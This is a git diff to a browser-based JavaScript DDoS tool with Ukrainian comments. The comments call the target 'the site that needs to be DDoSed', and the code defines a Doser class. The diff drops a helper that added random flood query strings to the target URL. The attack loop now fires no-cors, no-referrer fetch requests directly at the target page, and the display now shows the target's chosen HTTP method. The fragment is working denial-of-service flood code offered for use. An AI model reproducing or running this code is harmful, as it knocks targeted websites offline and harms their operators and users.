@@ -4,24 +4,13 @@
  * @typedef {Object} Target Ціль
  * @property {string} page Сайт, який треба дудосити
  * @property {"GET" | "POST"} method  Метод для атаки
- */
+ */ 
 
 
 /**
  * # Інструменти
  */
 const Tools = {
-	/**
-	 * Генерація **GET** запиту
-	 * 
-	 * @param {Target} target
-	 * @returns {Promise<string>} **URL**
-	 */
-	async composeVictim(target) {
-		let page = target.page;
-		return !page.includes('?') ? page + `?q=${await getFloodString(64)}` : page
-	},
-
 	/**
 	 * Зберігання данних про атаки
 	 */
@@ -37,7 +26,7 @@ const Tools = {
 	 */
 	setTarget(target) {
 		$("#target").text(target.page);
-		$("#method").text("GET")
+		$("#method").text(target.method)
 	},
 
 	/**
@@ -144,7 +133,7 @@ class Doser {
 
 			// TODO: ЗРОБИТИ РЕКУРСИВНИЙ TIMEOUT!
 			let attack = async () => {
-				await fetch(await Tools.composeVictim(this.target), {
+				await fetch(this.target.page, {
 					method: "GET",
 					mode: 'no-cors',
 					referrerPolicy: 'no-referrer',
